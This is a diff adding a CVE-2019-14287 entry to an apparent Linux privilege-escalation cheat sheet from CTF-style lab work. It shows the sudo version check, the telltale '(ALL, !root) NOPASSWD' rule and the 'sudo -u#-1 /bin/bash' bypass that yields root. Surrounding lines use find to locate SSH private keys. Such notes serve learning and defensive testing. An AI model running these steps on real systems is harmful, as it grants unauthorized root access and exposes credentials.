@@ -246,6 +246,22 @@ ls -la /
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
 ````
+### Old sudo version
+- CVE-2019-14287
+````
+sudo --version
+Sudoers I/O plugin version 1.8.21p2 #output
+sudo -l
+(ALL, !root) NOPASSWD: /bin/bash #output
+````
+- Looking for the `(ALL, !root) NOPASSWD:`, and Sudo (versions < 1.8.28).  Easy priv esc.
+````
+whoami
+tryhackme
+sudo -u#-1 /bin/bash
+whoami
+root
+````
 ### Sudo-Shell escape Sequences
 - List the programs which sudo allows your user to run:
 ````
